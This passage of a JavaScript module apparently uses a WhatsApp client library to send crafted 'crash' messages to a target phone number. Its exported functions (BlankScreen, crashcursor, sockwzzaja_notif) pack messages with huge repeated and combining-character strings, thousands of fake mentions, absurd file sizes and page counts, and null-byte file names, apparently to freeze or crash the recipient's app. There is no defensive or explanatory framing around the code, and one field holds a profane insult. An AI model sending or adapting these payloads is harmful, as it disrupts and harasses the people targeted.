̡̡̢̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈͘͘̚̕͘̕̚͘̚͘͘͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͠͠͝͝͠͠ͅͅͅͅͅͅͅͅ",
sourceUrl: "go fuck yourself",
sourceId: "dvx - problem",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "konsol - " + "⩟⬦𪲁 ͢𝐀͠𝐗͜-".repeat(1000),
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: null
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363274419384848@newsletter",
serverMessageId: 1,
newsletterName: `- C 𖣂     ⩟⬦𪲁 ͢𝐀͠𝐗͜- - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "⩟⬦𪲁 ͢𝐀͠𝐗͜-"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̷̡̢̢̢̢̢̡̢̢̨̧̛̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕̕̕̚̕͘̚̚͘͜͜͜͝͠͠͝͝͠͠͠͠͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͠͠͝͝͠͠ͅͅͅͅͅͅͅͅ "
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}

await sock.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
}

async function sockwzzaja_notif(sock, target) {
			await sock.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "\u0000",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: 'https://i.top4top.io/p_32261nror0.jpg',
									},
									hasMediaAttachment: true,
								},
								body: { 
					         text: "ꦾ".repeat(250000) + "@0".repeat(100000)
								},
								nativeFlowMessage: {
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["0@s.whatsapp.net", ...Array.from({
										length: 10000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "\u0000",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				{
					participant: {
						jid: target
					}
				}
			);
		};


module.exports = { 
BlankScreen,
crashcursor,
sockwzzaja_notif,
 };
